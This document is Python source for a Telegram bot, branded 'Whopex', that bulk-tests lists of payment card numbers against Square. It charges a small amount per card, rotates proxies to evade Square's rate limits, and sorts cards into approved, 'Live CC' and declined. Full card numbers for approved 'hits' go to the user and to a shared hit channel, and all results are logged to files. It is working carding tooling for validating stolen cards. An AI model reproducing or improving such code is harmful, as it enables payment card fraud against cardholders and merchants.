# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _square_bulk_processor(all_ccs: list, user_id: int, user_name: str,
                                  user_uname: str, chat_id: int, status_msg,
                                  stop_key: str, amount_cents: int = 100,
                                  proxy: Optional[str] = None,
                                  site_url: Optional[str] = None,
                                  proxy_list: Optional[list] = None):
    """v75 — Square bulk processor (streaming worker-pool, matches Shopify)."""
    from bot import (wpe, _to_bi, bold, safe_edit, user_link, _forward_charged_group,
                      bin_lookup, _save_to_checked_txt, bot, WE)
    from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
    from aiogram.types import BufferedInputFile
    import datetime as _dt

    total = len(all_ccs)
    if total == 0:
        try:
            await safe_edit(status_msg, f"{wpe('cross')} {_to_bi('No cards')}")
        except Exception:
            pass
        return

    proxies = proxy_list if proxy_list else ([proxy] if proxy else [])
    proxy_idx = [0]

    def _next_proxy():
        if not proxies:
            return ""
        p = proxies[proxy_idx[0] % len(proxies)]
        proxy_idx[0] += 1
        return p

    counters = {"processed": 0, "approved": 0, "declined": 0,
                "insufficient": 0, "three_ds": 0, "invalid": 0, "error": 0, "checked": 0}
    all_results: list[str] = []
    checked_cards: set = set()  # v75 — track which cards were actually checked
    user_link_html = user_link(user_id, user_name, user_uname)
    start_time = _dt.datetime.now(_dt.timezone.utc)
    _t0 = time.monotonic()
    _last_status_edit = 0.0
    _counters_lock = asyncio.Lock()
    rate_limited = [False]

    apis = _load_square_apis()
    n_apis = max(1, len(apis))
    # v76.1 — One card per API at a time. With 5 APIs, max 5 concurrent
    # checks = max 5 concurrent requests to Square. This is well under
    # Square's rate-limit threshold (which was triggering "Square 429"
    # when we had 15 workers × 5-API fan-out = 75 concurrent requests).
    CONCURRENCY = min(SQUARE_MAX_CONCURRENCY, n_apis)
    log.info("Square bulk: %d cards, %d APIs, %d workers (1 api per attempt, 1 card per api)", total, n_apis, CONCURRENCY)

    def _build_status_text() -> str:
        pending = total - counters["processed"]
        sep = "=" * 30
        _el = max(0.001, time.monotonic() - _t0)
        _speed = counters["processed"] / _el
        _eta = (pending / _speed) if (_speed > 0 and pending > 0) else 0
        rate_msg = ""
        if rate_limited[0]:
            rate_msg = f"\n{wpe('warn')} {_to_bi('Rate limited — pausing 60s')}"
        return (
            f"{wpe('sparkle')} {_to_bi('Square Bulk')} {wpe('sparkle')}\n\n"
            f"{sep}\n"
            f"{wpe('triple_ring')} {_to_bi('Total:')} {_to_bi(str(total))}\n"
            f"{wpe('check')} {_to_bi('Checked:')} {_to_bi(str(counters['processed']))}\n"
            f"{wpe('arc_reactor')} {_to_bi('Pending:')} {_to_bi(str(pending))}\n"
            f"{wpe('arrow_right')} {_to_bi('Proxies:')} {_to_bi(str(len(proxies)))}\n"
            f"{sep}\n"
            f"{wpe('approved')} {_to_bi('Approved:')} {_to_bi(str(counters['approved']))}\n"
            f"{wpe('insufficient')} {_to_bi('Live CC:')} {_to_bi(str(counters['insufficient']))}\n"
            f"{wpe('warn')} {_to_bi('3DS:')} {_to_bi(str(counters['three_ds']))}\n"
            f"{wpe('skull')} {_to_bi('Declined:')} {_to_bi(str(counters['declined']))}\n"
            f"{wpe('cross')} {_to_bi('Invalid:')} {_to_bi(str(counters['invalid']))}\n"
            f"{wpe('red_warn')} {_to_bi('Error:')} {_to_bi(str(counters['error']))}\n"
            f"{sep}\n"
            f"{wpe('bolt')} {_to_bi('Speed:')} {_to_bi(f'{_speed:.2f}/s')} {wpe('time')} {_to_bi('ETA:')} {_to_bi(f'{_eta:.0f}s')}\n"
            f"{wpe('rocket')} {_to_bi('Workers:')} {_to_bi(str(CONCURRENCY))}\n"
            f"{sep}\n\n{wpe('arc_reactor')} {_to_bi('Processing...')} {wpe('processing')}{rate_msg}"
        )

    def _build_stop_kb() -> dict:
        return {"inline_keyboard": [[{"text": f"{bold('STOP')}",
                "callback_data": f"square_bulk_stop:{stop_key}",
                "icon_custom_emoji_id": WE.get("skull", "5440681540541502133"),
                "style": "danger"}]]}

    await safe_edit(status_msg, _build_status_text(), reply_markup=_build_stop_kb())

    async def _check_one(cc: str):
        nonlocal _last_status_edit
        if _SQUARE_BULK_STOP_FLAGS.get(stop_key, False):
            return
        # v76 — pass the FULL proxy pool to square_check_card so it can rotate
        # proxies internally on proxy-burned errors (CONNECT tunnel failed,
        # hydrate failed, 403, curl 7, etc.). The outer 429-handling loop
        # below catches Square rate-limit (HTTP 429) specifically — that's a
        # separate concern from proxy burn.
        max_proxy_tries = max(3, len(proxies) + 1) if proxies else 3
        last_result = None
        consecutive_429 = 0

        for attempt in range(max_proxy_tries):
            if _SQUARE_BULK_STOP_FLAGS.get(stop_key, False):
                return
            # Pick a starting proxy for this attempt (round-robin)
            card_proxy = _next_proxy()
            try:
                # v76 — pass full pool so square_check_card rotates through
                # all proxies on transport/proxy errors
                result = await square_check_card(
                    cc, user_id=user_id, user_name=user_name,
                    user_uname=user_uname, amount_cents=amount_cents,
                    proxy=card_proxy, proxy_pool=proxies, priority=False,
                )
            except Exception as e:
                result = _error_result(cc, f"Check failed: {str(e)[:80]}", "", amount_cents)
            status = result.get("status", "UNKNOWN")
            resp_text = str(result.get("response", "")).lower()

            # v75/v76 — detect 429 (Square rate-limit, not proxy error)
            if "too many attempts" in resp_text or "429" in resp_text:
                consecutive_429 += 1
                # If we haven't tried all proxies yet → try next proxy IMMEDIATELY (no pause)
                if consecutive_429 < len(proxies) and attempt < max_proxy_tries - 1:
                    log.info("Square 429 on proxy %d/%d — trying next proxy immediately",
                             consecutive_429, len(proxies))
                    continue
                else:
                    # ALL proxies returned 429 — NOW pause 60s
                    rate_limited[0] = True
                    await safe_edit(status_msg, _build_status_text(), reply_markup=_build_stop_kb())
                    log.warning("Square 429 on ALL %d proxies — pausing 60s", len(proxies))
                    for _ in range(60):
                        if _SQUARE_BULK_STOP_FLAGS.get(stop_key, False): break
                        await asyncio.sleep(1)
                    rate_limited[0] = False
                    await safe_edit(status_msg, _build_status_text(), reply_markup=_build_stop_kb())
                    # After pause, try ONE more time with a fresh proxy
                    if proxies:
                        card_proxy = _next_proxy()
                    try:
                        result = await square_check_card(
                            cc, user_id=user_id, user_name=user_name,
                            user_uname=user_uname, amount_cents=amount_cents,
                            proxy=card_proxy, proxy_pool=proxies, priority=False,
                        )
                    except Exception as e:
                        result = _error_result(cc, f"Check failed: {str(e)[:80]}", "", amount_cents)
                    last_result = result
                    break

            # v76 — square_check_card already handled proxy rotation on ERROR
            # internally. If we still get ERROR here, it means all proxies
            # were tried. Accept the result unless we have more attempts AND
            # the error is a 429 (handled above).
            last_result = result
            break

        result = last_result or _error_result(cc, "All retries failed", "", amount_cents)
        status = result.get("status", "UNKNOWN")
        status_group = str(result.get("status_group", "") or "").upper() or \
            _group_from_code(str(status))
        checked_cards.add(cc)  # v75 — mark as checked
        async with _counters_lock:
            counters["processed"] += 1
            counters["checked"] += 1
            # v78 — categorize by the FRIENDLY bucket (status is the real code now)
            if status == "APPROVED" or status_group == "APPROVED":
                counters["approved"] += 1
            elif status_group == "3DS_REQUIRED": counters["three_ds"] += 1
            elif status_group == "INSUFFICIENT_FUNDS": counters["insufficient"] += 1
            elif status_group == "INVALID_CARD": counters["invalid"] += 1
            elif status_group == "ERROR": counters["error"] += 1
            else: counters["declined"] += 1
            current_processed = counters["processed"]
        response = result.get("response", "-")[:80]
        reason = result.get("reason", "-")[:60]
        price = result.get("price", "$1.00")
        elapsed = result.get("elapsed", 0)
        # v78 — line format: cc | GROUP | price | REAL_CODE | response | reason | elapsed
        all_results.append(f"{cc} | {status_group} | {price} | {status} | {response} | {reason} | {elapsed}s")
        try: await _save_to_checked_txt(cc, result, user_id, user_name, "msq")
        except: pass
        try: await _square_log_check(result, user_id, user_name, user_uname)
        except: pass
        try: await _square_save_dec_appr(cc, result, user_id, user_name, user_uname)
        except: pass
        if status == "APPROVED":
            try:
                bin_num = cc.split("|")[0][:6]
                bin_info = await bin_lookup(bin_num)
            except: bin_info = None
            msg_text = _square_format_message(result, user_link_html, cc, bin_info, amount_cents)
            try:
                await bot.send_message(chat_id, msg_text)
            except TelegramRetryAfter as r:
                await asyncio.sleep(r.retry_after + 0.5)
                try: await bot.send_message(chat_id, msg_text)
                except: pass
            except: pass
            try: await _forward_charged_group(card=cc, price=result.get("price", ""),
                gate=SQUARE_GATE_LABEL, response=result.get("display_response", ""),
                user_id=user_id, user_name=user_name, user_uname=user_uname,
                bin_info=bin_info, elapsed=float(result.get("elapsed", 0.0) or 0.0))
            except: pass
            try: asyncio.create_task(_send_square_hit_channel(price=result.get("price", "$1.00"),
                elapsed=float(result.get("elapsed", 0.0) or 0.0), user_id=user_id,
                user_name=user_name, user_uname=user_uname, amount_cents=amount_cents,
                response=result.get("response", ""), reason=result.get("reason", "")))
            except: pass
        _now_mono = time.monotonic()
        if (_last_status_edit == 0.0 or (_now_mono - _last_status_edit) >= 50.0
                or current_processed == total):
            _last_status_edit = _now_mono
            asyncio.create_task(safe_edit(status_msg, _build_status_text(), reply_markup=_build_stop_kb()))
        await asyncio.sleep(0)

    cc_queue: asyncio.Queue[str] = asyncio.Queue()
    for cc in all_ccs: cc_queue.put_nowait(cc)

    async def _worker(worker_idx: int):
        while not _SQUARE_BULK_STOP_FLAGS.get(stop_key, False):
            try: cc = cc_queue.get_nowait()
            except asyncio.QueueEmpty: break
            crash_retries = 0
            while True:
                try:
                    await _check_one(cc)
                    break
                except Exception as e:
                    crash_retries += 1
                    log.error("Square worker crash cc=%s attempt %d: %s", str(cc).split("|")[0], crash_retries, e)
                    if (_SQUARE_BULK_STOP_FLAGS.get(stop_key, False) or crash_retries >= 3):
                        async with _counters_lock:
                            counters["processed"] += 1
                            counters["declined"] += 1
                        all_results.append(f"{cc} | DECLINED | $1.00 | Worker crash | No response | 0s")
                        break
                    await asyncio.sleep(0.5)
            cc_queue.task_done()
            await asyncio.sleep(0)

    workers = [asyncio.create_task(_worker(i)) for i in range(CONCURRENCY)]
    try:
        while True:
            _done, _pending = await asyncio.wait(set(workers), timeout=0.5, return_when=asyncio.FIRST_COMPLETED)
            if all(w.done() for w in workers): break
            if _SQUARE_BULK_STOP_FLAGS.get(stop_key, False):
                for w in workers:
                    if not w.done(): w.cancel()
                await asyncio.gather(*workers, return_exceptions=True)
                break
    except: pass

    was_stopped = _SQUARE_BULK_STOP_FLAGS.get(stop_key, False)
    end_time = _dt.datetime.now(_dt.timezone.utc)
    duration = (end_time - start_time).total_seconds()
    status_label = "STOPPED" if was_stopped else "COMPLETED"
    try:
        await safe_edit(status_msg,
            f"{wpe('sparkle')} {_to_bi('Square Bulk')} {_to_bi(status_label)} {wpe('sparkle')}\n\n"
            f"{'=' * 30}\n"
            f"{wpe('triple_ring')} {_to_bi('Total:')} {_to_bi(str(total))}\n"
            f"{wpe('check')} {_to_bi('Checked:')} {_to_bi(str(counters['processed']))}\n"
            f"{'=' * 30}\n"
            f"{wpe('approved')} {_to_bi('Approved:')} {_to_bi(str(counters['approved']))}\n"
            f"{wpe('insufficient')} {_to_bi('Live CC:')} {_to_bi(str(counters['insufficient']))}\n"
            f"{wpe('warn')} {_to_bi('3DS:')} {_to_bi(str(counters['three_ds']))}\n"
            f"{wpe('skull')} {_to_bi('Declined:')} {_to_bi(str(counters['declined']))}\n"
            f"{wpe('cross')} {_to_bi('Invalid:')} {_to_bi(str(counters['invalid']))}\n"
            f"{wpe('red_warn')} {_to_bi('Error:')} {_to_bi(str(counters['error']))}\n"
            f"{'=' * 30}\n"
            f"{wpe('bolt')} {_to_bi('Duration:')} {_to_bi(f'{duration:.1f}s')}\n"
            f"{wpe('whop_hitter')} {_to_bi('Whopex')}")
    except: pass

    # v75 — add unchecked cards (STOP was pressed before they were checked)
    unchecked = [cc for cc in all_ccs if cc not in checked_cards]
    if unchecked:
        for cc in unchecked:
            all_results.append(f"{cc} | NOT_CHECKED | - | - | Stopped by user | 0s")

    if all_results:
        try:
            ts = start_time.strftime("%Y-%m-%d %H:%M:%S")
            # v75 — separate results by category in the .txt file
            cat_lines = {"APPROVED": [], "3DS_REQUIRED": [], "INSUFFICIENT_FUNDS": [],
                         "DECLINED": [], "INVALID_CARD": [], "CVV_MISMATCH": [],
                         "EXPIRED_CARD": [], "ERROR": [], "UNKNOWN": [],
                         "NOT_CHECKED": []}
            for line in all_results:
                parts = line.split(" | ")
                if len(parts) >= 2:
                    cat = parts[1].strip()
                    if cat in cat_lines:
                        cat_lines[cat].append(line)
                    else:
                        cat_lines["UNKNOWN"].append(line)
                else:
                    cat_lines["UNKNOWN"].append(line)

            txt_content = (
                f"# Square Bulk Results — {ts}\n"
                f"# User: {user_uname or user_name} ({user_id})\n"
                f"# Total: {total} | Checked: {counters['processed']}\n"
                f"# Approved: {counters['approved']} | Declined: {counters['declined']} | "
                f"Invalid: {counters['invalid']} | 3DS: {counters['three_ds']} | "
                f"Error: {counters['error']}\n"
                f"# Amount: ${amount_cents / 100:.2f} per card\n"
                f"# Duration: {duration:.1f}s\n"
                f"{'=' * 60}\n\n"
            )
            # Approved section
            if cat_lines["APPROVED"]:
                txt_content += f"{'='*20} APPROVED ({len(cat_lines['APPROVED'])}) {'='*20}\n"
                for line in cat_lines["APPROVED"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # 3DS section
            if cat_lines["3DS_REQUIRED"]:
                txt_content += f"{'='*20} 3DS REQUIRED ({len(cat_lines['3DS_REQUIRED'])}) {'='*20}\n"
                for line in cat_lines["3DS_REQUIRED"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Insufficient (Live CC)
            if cat_lines["INSUFFICIENT_FUNDS"]:
                txt_content += f"{'='*20} INSUFFICIENT FUNDS ({len(cat_lines['INSUFFICIENT_FUNDS'])}) {'='*20}\n"
                for line in cat_lines["INSUFFICIENT_FUNDS"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Declined
            if cat_lines["DECLINED"]:
                txt_content += f"{'='*20} DECLINED ({len(cat_lines['DECLINED'])}) {'='*20}\n"
                for line in cat_lines["DECLINED"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Invalid card
            if cat_lines["INVALID_CARD"]:
                txt_content += f"{'='*20} INVALID CARD ({len(cat_lines['INVALID_CARD'])}) {'='*20}\n"
                for line in cat_lines["INVALID_CARD"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # CVV mismatch
            if cat_lines["CVV_MISMATCH"]:
                txt_content += f"{'='*20} CVV MISMATCH ({len(cat_lines['CVV_MISMATCH'])}) {'='*20}\n"
                for line in cat_lines["CVV_MISMATCH"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Expired
            if cat_lines["EXPIRED_CARD"]:
                txt_content += f"{'='*20} EXPIRED CARD ({len(cat_lines['EXPIRED_CARD'])}) {'='*20}\n"
                for line in cat_lines["EXPIRED_CARD"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Unknown
            if cat_lines["UNKNOWN"]:
                txt_content += f"{'='*20} UNKNOWN ({len(cat_lines['UNKNOWN'])}) {'='*20}\n"
                for line in cat_lines["UNKNOWN"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Error
            if cat_lines["ERROR"]:
                txt_content += f"{'='*20} ERROR ({len(cat_lines['ERROR'])}) {'='*20}\n"
                for line in cat_lines["ERROR"]:
                    txt_content += line + "\n"
                txt_content += "\n"
            # Not checked (STOP was pressed)
            not_checked = [l for l in all_results if " | NOT_CHECKED | " in l]
            if not_checked:
                txt_content += f"{'='*20} NOT CHECKED ({len(not_checked)}) {'='*20}\n"
                for line in not_checked:
                    txt_content += line + "\n"

            file_bytes = txt_content.encode("utf-8")
            filename = f"square_bulk_{user_id}_{int(time.time())}.txt"
            input_file = BufferedInputFile(file=file_bytes, filename=filename)
            await status_msg.answer_document(document=input_file, caption=(
                f"{wpe('sparkle')} {_to_bi('Square Bulk Results')}\n"
                f"{wpe('triple_ring')} {_to_bi('Checked:')} {_to_bi(str(counters['processed']))}\n"
                f"{wpe('approved')} {_to_bi('Approved:')} {_to_bi(str(counters['approved']))}\n"
                f"{wpe('insufficient')} {_to_bi('Live CC:')} {_to_bi(str(counters['insufficient']))}\n"
                f"{wpe('warn')} {_to_bi('3DS:')} {_to_bi(str(counters['three_ds']))}\n"
                f"{wpe('skull')} {_to_bi('Declined:')} {_to_bi(str(counters['declined']))}\n"
                f"{wpe('cross')} {_to_bi('Invalid:')} {_to_bi(str(counters['invalid']))}\n"
                f"{wpe('red_warn')} {_to_bi('Error:')} {_to_bi(str(counters['error']))}\n"
                f"{wpe('whop_hitter')} {_to_bi('Whopex')}"))
        except Exception as e:
            log.error("Failed to send .txt file: %s", e)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FORMATTER  — build the user-facing message
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _square_format_message(result: dict, user_link_html: str = "",
                            cc_str: str = "", bin_info: Optional[dict] = None,
                            amount_cents: int = 100) -> str:
    """Build the user-facing message for a Square check result.

    Output shape (matches the whop/shopify/st1 formatters):
      <header emoji> Square <STATUS>
      CC: <card>
      Site: Square
      Price: $1.00
      Time: 12.34s
      Response: <response>
      Reason: <reason>            ← v75 NEW — every message shows the reason
      [BIN Info block]
      Checked by: <user>
      Gate: Square
      Whopex / Made by @tatsuyo_001
    """
    from bot import wpe, _to_bi, bold, brand_emoji

    status = str(result.get("status", "UNKNOWN"))
    # v78 — friendly bucket drives the header; the REAL code goes in Response:
    group = str(result.get("status_group", "") or "").upper()
    if not group:
        group = _group_from_code(status)
    price = str(result.get("price", f"${amount_cents / 100:.2f}"))
    elapsed = float(result.get("elapsed", 0.0) or 0.0)
    response = str(result.get("response", "-"))
    reason = str(result.get("reason", ""))
    display_response = str(result.get("display_response") or status or response)[:120]

    # Header — friendly bucket (the exact code is shown in the Response line)
    if group == "APPROVED":
        header = f"{wpe('approved')} {_to_bi('Square')} {_to_bi('APPROVED')} {wpe('approved')}"
    elif group == "INSUFFICIENT_FUNDS":
        header = f"{wpe('insufficient')} {_to_bi('Square')} {_to_bi('INSUFFICIENT')} {_to_bi('Live CC')} {wpe('insufficient')}"
    elif group == "CVV_MISMATCH":
        header = f"{wpe('warn')} {_to_bi('Square')} {_to_bi('CVV MISMATCH')} {wpe('warn')}"
    elif group == "INVALID_CARD":
        header = f"{wpe('cross')} {_to_bi('Square')} {_to_bi('INVALID CARD')} {wpe('cross')}"
    elif group == "EXPIRED_CARD":
        header = f"{wpe('skull')} {_to_bi('Square')} {_to_bi('EXPIRED')} {wpe('skull')}"
    elif group == "3DS_REQUIRED":
        header = f"{wpe('warn')} {_to_bi('Square')} {_to_bi('3DS REQUIRED')} {wpe('warn')}"
    elif group == "SESSION_EXPIRED":
        header = f"{wpe('warn')} {_to_bi('Square')} {_to_bi('LINK EXPIRED')} {wpe('warn')}"
    elif group == "ERROR":
        header = f"{wpe('red_warn')} {_to_bi('Square')} {_to_bi('ERROR')} {wpe('red_warn')}"
    elif group == "DECLINED":
        header = f"{wpe('skull')} {_to_bi('Square')} {_to_bi('DECLINED')} {wpe('skull')}"
    else:
        # unknown bucket — show the REAL code itself (no invention)
        header = f"{wpe('warn')} {_to_bi('Square')} {_to_bi(status[:60])} {wpe('warn')}"

    cc_line = f"{wpe('card')} {_to_bi('CC:')} <code>{cc_str}</code>\n" if cc_str else ""

    if bin_info and isinstance(bin_info, dict) and bin_info.get("brand"):
        bin_block = (
            f"{wpe('triple_ring')} {_to_bi('BIN Info:')}\n"
            f"{brand_emoji(bin_info.get('brand', '-'))}{_to_bi('Brand:')} {_to_bi(bin_info.get('brand', '-'))}\n"
            f"{wpe('arrow_right')} {_to_bi('Type:')} {_to_bi(bin_info.get('type', '-'))}\n"
            f"{wpe('arrow_right')} {_to_bi('Bank:')} {_to_bi(bin_info.get('bank', '-'))}\n"
            f"{wpe('arrow_right')} {_to_bi('Country:')} {bin_info.get('flag', '')} {_to_bi(bin_info.get('country', '-'))}\n\n"
        )
    else:
        bin_block = ""

    if user_link_html:
        checked_by = f"{wpe('checked_by')} {_to_bi('Checked by:')} {user_link_html}"
    else:
        checked_by = f"{wpe('checked_by')} {_to_bi('Checked by:')} {bold('Whopex')}"

    # v75 — Reason line. APPROVED shows no reason (per spec).
    if group == "APPROVED":
        reason_line = ""
    else:
        reason_line = f"{wpe('gem')} {_to_bi('Reason:')} {_to_bi(reason)}\n"

    # v78 — 3DS + HTTP lines from the REAL processor response (non-APPROVED only)
    extra_line = ""
    if group != "APPROVED":
        tds = result.get("three_ds") or {}
        if isinstance(tds, dict):
            tds_status = tds.get("three_ds_transaction_status")
            tds_chal = tds.get("three_ds_issuer_challenged")
            if tds_status or tds_chal is not None:
                extra_line += (f"{wpe('warn')} {_to_bi('3DS:')} {_to_bi(str(tds_status or '-'))}"
                               f" | {_to_bi('Challenged:')} {_to_bi(str(tds_chal))}\n")
        hs = result.get("http_status")
        if hs:
            extra_line += f"{wpe('arrow_right')} {_to_bi('HTTP:')} {_to_bi(str(hs))}\n"

    return (
        f"{header}\n\n"
        f"{cc_line}"
        f"{wpe('site')} {_to_bi('Site:')} {_to_bi('Square')}\n"
        f"{wpe('amount')} {_to_bi('Price:')} {_to_bi(price)}\n"
        f"{wpe('time')} {_to_bi('Time:')} {_to_bi(f'{elapsed:.2f}s')}\n"
        f"{wpe('gem')} {_to_bi('Response:')} {_to_bi(display_response)}\n"
        f"{reason_line}"
        f"{extra_line}"
        f"\n{bin_block}"
        f"{checked_by}\n"
        f"{_to_bi('gate')} : {wpe('sparkle')} {_to_bi('Square')}\n"
        f"{wpe('sparkle')} {_to_bi('Whopex')}\n"
        f"{_to_bi('Made by @tatsuyo_001')}"
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HIT-CHANNEL FORWARDER  — post APPROVED hits to the hit group
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _send_square_hit_channel(*, price: str, elapsed: float,
                                    user_id: int, user_name: str, user_uname: str,
                                    amount_cents: int = 100,
                                    response: str = "", reason: str = ""):
    """Post APPROVED Square hits to the hit channel (mirrors _send_st1_hit_channel)."""
    try:
        from bot import bot, user_link, wpe, _to_bi
        from whop import WHOP_HIT_LOG_GROUP_ID
        from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError

        uname_html = user_link(user_id, user_name, user_uname)
        header = f"{wpe('approved')} {_to_bi('Square')} {_to_bi('APPROVED')} {wpe('approved')}"
        sep = "-" * 30
        text = (
            f"{header}\n\n"
            f"{sep}\n"
            f"{wpe('amount')} {_to_bi('Price:')} {_to_bi(str(price))} {_to_bi('Charged')}\n"
            f"{wpe('time')} {_to_bi('Time:')} {_to_bi(f'{float(elapsed or 0):.2f}s')}\n"
            f"{wpe('gem')} {_to_bi('Response:')} {_to_bi(str(response)[:80])}\n"
            f"{sep}\n"
            f"{wpe('checked_by')} {_to_bi('Checked by:')} {uname_html}\n"
            f"{_to_bi('gate')} : {wpe('sparkle')} {_to_bi('Square')}\n"
            f"{wpe('sparkle')} {_to_bi('Whopex')}\n"
            f"{_to_bi('Made by @tatsuyo_001')}"
        )
        try:
            await bot.send_message(WHOP_HIT_LOG_GROUP_ID, text,
                parse_mode="HTML", disable_web_page_preview=True,
                disable_notification=False)
        except TelegramRetryAfter as r:
            await asyncio.sleep(r.retry_after + 0.5)
            await bot.send_message(WHOP_HIT_LOG_GROUP_ID, text,
                parse_mode="HTML", disable_web_page_preview=True)
        except (TelegramBadRequest, TelegramForbiddenError) as e:
            log.error("square hit-log group send failed: %s", e)
    except Exception as e:
        log.error("_send_square_hit_channel crashed: %s", e)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  LOG + DEC/APPROVED FILE WRITERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_square_log_lock = asyncio.Lock() if False else None
_square_dec_appr_lock = asyncio.Lock() if False else None
_square_logs_first_write = True
_square_dec_appr_first_write = True


async def _square_log_check(result: dict, user_id: int, user_name: str, user_uname: str):
    """Append the result to square_logs.txt."""
    global _square_logs_first_write
    try:
        from datetime import datetime
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cc = result.get("card", "?")
        status = result.get("status", "?")
        response = result.get("response", "-")
        reason = result.get("reason", "-")
        price = result.get("price", "-")
        elapsed = result.get("elapsed", 0)
        line = (f"[{ts}] user={user_id} ({user_uname or user_name}) "
                f"card={cc} status={status} price={price} "
                f"response={response[:80]} reason={reason[:80]} "
                f"elapsed={elapsed}s\n")
        # Async write via run_in_executor
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, _append_file, SQUARE_LOGS_FILE, line, _square_logs_first_write)
        _square_logs_first_write = False
    except Exception as e:
        log.error("_square_log_check: %s", e)


async def _square_save_dec_appr(card: str, result: dict, user_id: int,
                                 user_name: str, user_uname: str):
    """Append declined/approved cards to square_dec&approved.txt."""
    global _square_dec_appr_first_write
    try:
        from datetime import datetime
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = result.get("status", "?")
        group = str(result.get("status_group", "") or "").upper()
        # Only save real verdicts — skip transport errors / unknown / dead link
        if status in ("ERROR", "UNKNOWN", "SESSION_EXPIRED") or \
           group in ("ERROR", "UNKNOWN", "SESSION_EXPIRED"):
            return
        price = result.get("price", "-")
        response = result.get("response", "-")
        reason = result.get("reason", "-")
        line = (f"[{ts}] {card} | {status} | {price} | "
                f"response={response[:80]} | reason={reason[:80]} | "
                f"user={user_id} ({user_uname or user_name})\n")
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, _append_file, SQUARE_DEC_APPROVED_FILE,
                                    line, _square_dec_appr_first_write)
        _square_dec_appr_first_write = False
    except Exception as e:
        log.error("_square_save_dec_appr: %s", e)


def _append_file(path: str, line: str, is_first: bool):
    """Append a line to a file (sync helper for run_in_executor)."""
    try:
        mode = "a" if not is_first or os.path.exists(path) else "w"
        with open(path, mode, encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        log.error("append_file %s: %s", path, e)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MODULE INIT  — ensure files exist on import
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_ensure_square_files()
